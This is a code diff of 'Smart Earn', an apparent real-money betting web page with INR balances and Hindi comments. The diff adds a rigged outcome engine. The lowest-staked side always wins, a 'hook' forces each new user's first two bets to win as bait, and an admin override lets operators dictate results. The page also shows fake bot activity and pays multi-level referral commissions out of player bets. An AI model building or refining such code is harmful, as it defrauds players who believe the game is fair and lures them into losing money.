@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Smart Earn - Play & Win</title>
     <style>
-        /* CSS बिल्कुल वैसा ही है, कोई बदलाव नहीं */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0b0e14; color: #e2e8f0; padding-bottom: 70px; } 
 
@@ -66,6 +65,7 @@
         .bet-dir.down { color: #ff4d4d; }
         .bet-dir.num { color: #f3ba2f; font-size: 15px;}
 
+        /* 🔥 UPDATED: BOTTOM NAVIGATION BAR (Added Help) 🔥 */
         .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #151a25; border-top: 1px solid #2a2f3a; display: flex; justify-content: space-around; padding: 10px 0; z-index: 1000;}
         .nav-item { text-align: center; color: #a0a5b1; font-size: 11px; font-weight: bold; cursor: pointer; flex: 1; text-transform: uppercase;}
         .nav-item.active { color: #f3ba2f; }
@@ -236,11 +236,14 @@
         let userData = {};
         let basePrice = 5345230; 
         let selectedTab = 30; 
-        let globalTimers = { 15: 15, 30: 30, 60: 60 };
         let activeUserBets = { 15: [], 30: [], 60: [] }; 
         let currentBetType = "";
         let currentBetValue = "";
         let winMultiplier = 1.9; 
+
+        // 🔥 NEW: Global Sync & Admin Controls Data 🔥
+        let currentRoundIds = { 15: 0, 30: 0, 60: 0 };
+        let adminGameControls = { 15: {}, 30: {}, 60: {} };
 
         window.onload = function() {
             let saved = localStorage.getItem('smartEarnUser');
@@ -248,27 +251,31 @@
             userData = JSON.parse(saved);
             
             if(!userData.gameHistory) userData.gameHistory = [];
+            if(!userData.hookWins) userData.hookWins = 0; // NEW: Hook Tracker
 
             document.getElementById('user-id-btn').innerText = "ID: " + userData.myRefCode;
             updateBalanceUI();
-            startGlobalTimers();
+            
+            // 🔥 START GLOBAL INTERNET TIMER 🔥
+            startPerfectGlobalTimers();
             startFakeBots();
 
-            // 🔥 NEW: REAL-TIME ADMIN SYNC 🔥 (बिना किसी पुराने कोड को हटाए)
+            // 🔥 Listen to Admin Controls 🔥
+            db.ref('game_controls').on('value', snap => {
+                if(snap.val()) adminGameControls = snap.val();
+            });
+
+            // Listen to Real-time Balance & Status
             if(userData.phone) {
                 db.ref('users/' + userData.phone).on('value', (snapshot) => {
                     if(snapshot.exists()) {
                         let serverData = snapshot.val();
-                        
-                        // 1. अगर एडमिन ने ब्लॉक कर दिया है
                         if(serverData.accountStatus === "Blocked") {
                             alert("🚫 Your account has been BLOCKED by Admin.");
                             localStorage.removeItem('smartEarnUser');
                             window.location.href = "index.html";
                             return;
                         }
-                        
-                        // 2. रियल-टाइम बैलेंस सिंक (एडमिन बैलेंस बदलेगा तो यहाँ अपने आप दिखेगा)
                         userData.inrBalance = parseFloat(serverData.inrBalance) || 0;
                         document.getElementById('user-inr').innerText = "₹" + userData.inrBalance.toFixed(2);
                         localStorage.setItem('smartEarnUser', JSON.stringify(userData));
@@ -280,26 +287,18 @@
         function updateBalanceUI() {
             document.getElementById('user-inr').innerText = "₹" + userData.inrBalance.toFixed(2);
             localStorage.setItem('smartEarnUser', JSON.stringify(userData));
-            if(userData.phone) {
-                db.ref('users/' + userData.phone).update(userData).catch(err => console.log(err));
-            }
+            if(userData.phone) { db.ref('users/' + userData.phone).update({ inrBalance: userData.inrBalance, hookWins: userData.hookWins }).catch(e=>{}); }
         }
 
         function dailyCheckIn() {
             let today = new Date().toDateString();
-            if(userData.lastCheckIn === today) {
-                alert("❌ You have already claimed today's bonus!\nCome back tomorrow.");
-                return;
-            }
-
+            if(userData.lastCheckIn === today) return alert("❌ You have already claimed today's bonus!\nCome back tomorrow.");
             userData.checkInDay = (userData.checkInDay || 0) + 1;
             if(userData.checkInDay > 7) userData.checkInDay = 1; 
-
             let bonus = userData.checkInDay * 10; 
             userData.inrBalance += bonus;
             userData.lastCheckIn = today;
             updateBalanceUI();
-
             alert(`🎁 Day ${userData.checkInDay} Check-in Successful!\n\n+₹${bonus} added to your Main Wallet directly.`);
         }
 
@@ -315,31 +314,48 @@
             if(change < 0) priceEl.classList.add('down'); else priceEl.classList.remove('down');
         }, 800);
 
-        function startGlobalTimers() {
+        // 🔥 NEW: PERFECT GLOBAL INTERNET TIMER 🔥
+        function startPerfectGlobalTimers() {
             setInterval(() => {
+                let nowUnix = Math.floor(Date.now() / 1000); // Global Internet Second
+                
                 [15, 30, 60].forEach(t => {
-                    globalTimers[t]--;
-                    let tVal = globalTimers[t];
+                    let elapsedInCycle = nowUnix % t;
+                    let remaining = t - elapsedInCycle;
+                    if(remaining === t) remaining = 0; 
+                    
+                    let currentRoundId = nowUnix - elapsedInCycle; // Unique Round ID
+
                     if(selectedTab === t) {
                         let mainTimerEl = document.getElementById('main-display-timer');
-                        mainTimerEl.innerText = `00:${tVal < 10 ? '0'+tVal : tVal}`;
-                        if(tVal <= 5) mainTimerEl.classList.add('warning');
+                        mainTimerEl.innerText = `00:${remaining < 10 ? '0'+remaining : remaining}`;
+                        if(remaining <= 5 && remaining > 0) mainTimerEl.classList.add('warning');
                         else mainTimerEl.classList.remove('warning');
                     }
-                    if(tVal <= 0) { resolveRound(t); globalTimers[t] = t; }
+
+                    // Resolve exactly when round changes
+                    if (currentRoundIds[t] !== 0 && currentRoundIds[t] !== currentRoundId) {
+                        resolveRound(t);
+                    }
+                    currentRoundIds[t] = currentRoundId;
                 });
-            }, 1000);
+            }, 500); // Check every half second for perfect sync
         }
 
         function selectTab(seconds) {
             selectedTab = seconds;
             document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
             document.getElementById(`tab-${seconds}`).classList.add('active');
-            document.getElementById('main-display-timer').innerText = `00:${globalTimers[seconds] < 10 ? '0'+globalTimers[seconds] : globalTimers[seconds]}`;
+            let nowUnix = Math.floor(Date.now() / 1000);
+            let rem = seconds - (nowUnix % seconds);
+            document.getElementById('main-display-timer').innerText = `00:${rem < 10 ? '0'+rem : rem}`;
         }
 
         function openBetPopup(type, value) {
-            if(globalTimers[selectedTab] <= 5) return alert(`⏳ BETTING CLOSED! Please wait for new round.`);
+            let nowUnix = Math.floor(Date.now() / 1000);
+            let rem = selectedTab - (nowUnix % selectedTab);
+            if(rem <= 5) return alert(`⏳ BETTING CLOSED! Please wait for new round.`);
+            
             currentBetType = type; currentBetValue = value;
             document.getElementById('popup-title').innerText = type === 'DIR' ? value : `Number ${value}`;
             winMultiplier = type === 'DIR' ? 1.9 : 5.0;
@@ -360,9 +376,47 @@
             let betId = 'bet-' + Date.now() + Math.floor(Math.random()*1000);
             activeUserBets[selectedTab].push({ id: betId, type: currentBetType, value: currentBetValue, amount: amt });
             addMyBetRow(betId, currentBetType === 'DIR' ? currentBetValue : "No. " + currentBetValue, amt);
+            
+            // 🔥 LIVE ADMIN POOL SYNC 🔥
+            let poolKey = currentBetType === 'DIR' ? currentBetValue : 'NUM_' + currentBetValue;
+            db.ref(`live_pools/${selectedTab}/${poolKey}`).transaction(val => (val || 0) + amt);
+
+            // 🔥 REAL-TIME COMMISSION DISTRIBUTION 🔥
+            distributeCommission(amt);
+
             switchBetTab('my'); closeBetPopup();
         }
 
+        // 🔥 NEW: REAL-TIME REFERRAL COMMISSION 🔥
+        function distributeCommission(betAmt) {
+            if(!userData.sponsoredBy) return;
+            // Level 1 (Direct - 1%)
+            db.ref('users').orderByChild('myRefCode').equalTo(userData.sponsoredBy).once('value', snap => {
+                let lvl1 = snap.val();
+                if(lvl1) {
+                    let l1Key = Object.keys(lvl1)[0];
+                    let comm1 = betAmt * 0.01;
+                    db.ref(`users/${l1Key}/inrBalance`).transaction(b => (b||0) + comm1);
+                    db.ref(`users/${l1Key}/referralEarnings`).transaction(c => (c||0) + comm1);
+
+                    // Level 2 (All Team - 0.1%)
+                    let l1Data = lvl1[l1Key];
+                    if(l1Data.sponsoredBy) {
+                        db.ref('users').orderByChild('myRefCode').equalTo(l1Data.sponsoredBy).once('value', snap2 => {
+                            let lvl2 = snap2.val();
+                            if(lvl2) {
+                                let l2Key = Object.keys(lvl2)[0];
+                                let comm2 = betAmt * 0.001;
+                                db.ref(`users/${l2Key}/inrBalance`).transaction(b => (b||0) + comm2);
+                                db.ref(`users/${l2Key}/referralEarnings`).transaction(c => (c||0) + comm2);
+                            }
+                        });
+                    }
+                }
+            });
+        }
+
+        // 🔥 THE MASTER ENGINE: Admin Override & Hook Logic 🔥
         function resolveRound(timeframe) {
             let bets = activeUserBets[timeframe];
             if(bets.length > 0) {
@@ -375,23 +429,39 @@
                 });
 
                 let winningDir = "UP";
-                if (totalUp > totalDown) winningDir = "DOWN"; 
-                else if (totalDown > totalUp) winningDir = "UP"; 
-                else winningDir = Math.random() > 0.5 ? "UP" : "DOWN"; 
+                let winningNum = 0;
 
-                let minNumAmount = Infinity;
-                for(let i=0; i<=9; i++) { if(numBets[i] < minNumAmount) minNumAmount = numBets[i]; }
-                let candidateNums = [];
-                for(let i=0; i<=9; i++) { if(numBets[i] === minNumAmount) candidateNums.push(i); }
-                let winningNum = candidateNums[Math.floor(Math.random() * candidateNums.length)];
+                // 1. AUTO LOGIC (Lowest Volume Wins)
+                winningDir = totalUp > totalDown ? "DOWN" : "UP";
+                let minNumAmt = Infinity;
+                for(let i=0; i<=9; i++) { if(numBets[i] < minNumAmt) minNumAmt = numBets[i]; }
+                let candNums = [];
+                for(let i=0; i<=9; i++) { if(numBets[i] === minNumAmt) candNums.push(i); }
+                winningNum = candNums[Math.floor(Math.random() * candNums.length)];
 
+                // 2. NEW USER HOOK LOGIC (First 2 Bets = 100% Win)
+                let isNewbie = userData.hookWins < 2;
+                if(isNewbie) {
+                    let firstBet = bets[0]; // जिताने के लिए पहली बेट उठाओ
+                    if(firstBet.type === 'DIR') winningDir = firstBet.value;
+                    if(firstBet.type === 'NUM') winningNum = firstBet.value;
+                    userData.hookWins += 1;
+                }
+
+                // 3. ADMIN OVERRIDE (Highest Priority)
+                let fDir = adminGameControls[timeframe]?.force_dir || "AUTO";
+                let fNum = adminGameControls[timeframe]?.force_num || "AUTO";
+                if(fDir !== "AUTO") winningDir = fDir;
+                if(fNum !== "AUTO") winningNum = parseInt(fNum);
+
+                // EVALUATE
                 let userTotalWin = 0;
                 let dateStr = new Date().toLocaleString();
 
                 bets.forEach(bet => {
                     let isWin = false; let profit = 0;
                     if(bet.type === 'DIR' && bet.value === winningDir) { isWin = true; profit = bet.amount * 1.9; } 
-                    else if(bet.type === 'NUM' && bet.value === winningNum) { isWin = true; profit = bet.amount * 5.0; }
+                    else if(bet.type === 'NUM' && bet.value == winningNum) { isWin = true; profit = bet.amount * 5.0; }
                     
                     let historyItem = {
                         date: dateStr, timeframe: timeframe,
@@ -399,8 +469,9 @@
                         amount: bet.amount, result: isWin ? "Win" : "Lose",
                         profit: isWin ? profit : 0
                     };
-                    userData.gameHistory.push(historyItem);
+                    userData.gameHistory.push(historyItem); // Saved Forever
 
+                    // Keep Bet row visible on screen and just update status
                     let row = document.getElementById(bet.id);
                     if(row) {
                         let statusEl = row.querySelector('.bet-status');
@@ -411,14 +482,10 @@
                 });
 
                 if(userTotalWin > 0) { userData.inrBalance += userTotalWin; updateBalanceUI(); showWinPopup(userTotalWin); }
-                
-                localStorage.setItem('smartEarnUser', JSON.stringify(userData)); 
-                if(userData.phone) {
-                    db.ref('users/' + userData.phone).set(userData).catch(err => console.log(err));
-                }
+                else { updateBalanceUI(); } // Save Hook counts
 
+                // Reset Array, but DO NOT clear HTML list
                 activeUserBets[timeframe] = []; 
-                setTimeout(() => { switchBetTab('global'); }, 2000);
             }
         }
 
